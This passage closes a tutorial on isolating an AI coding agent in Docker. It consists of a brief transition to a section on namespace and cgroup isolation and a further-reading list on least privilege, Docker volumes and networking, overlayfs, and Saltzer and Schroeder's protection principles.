Identity directories and bind mounts are filesystem-level controls.  The next activity zooms out to the container level, examining what Docker's namespace and cgroup isolation actually guarantees, and what it leaves unprotected, when the process inside is an AI agent that can generate and execute code.

---

## Further Reading

- "The Principle of Least Privilege."  OWASP Top Ten documentation. https://owasp.org/www-project-developer-guide/draft/design/web_app_checklist/digital_identity/, foundational security principle applied throughout this tutorial.
- Docker Documentation: "Use volumes." https://docs.docker.com/storage/volumes/, specifically the sections on bind mounts vs. named volumes and read-only mounts.
- pi.  https://pi.dev, the terminal coding agent used in the worked example; small enough that its whole footprint fits in a Dockerfile you can read.
- pi-openai-compat.  https://github.com/BillJr99/pi-openai-compat, the pi plugin that registers OpenAI-compatible endpoints (Ollama, OpenWebUI, and others) as native pi providers, several at once.
- Docker Documentation: "Networking."  https://docs.docker.com/engine/network/, the reference for `host.docker.internal`, `--add-host`, and `--network none`.
- Julia Evans.  "How containers work: overlayfs." https://jvns.ca/blog/2019/11/18/how-containers-work--overlayfs/, intuitive explanation of what Docker isolation actually does at the filesystem level.
- Saltzer and Schroeder.  "The Protection of Information in Computer Systems."  *Proceedings of the IEEE* (1975).  The original paper enumerating least privilege, fail-safe defaults, and economy of mechanism, principles that are fifty years old and still directly applicable to agent design.
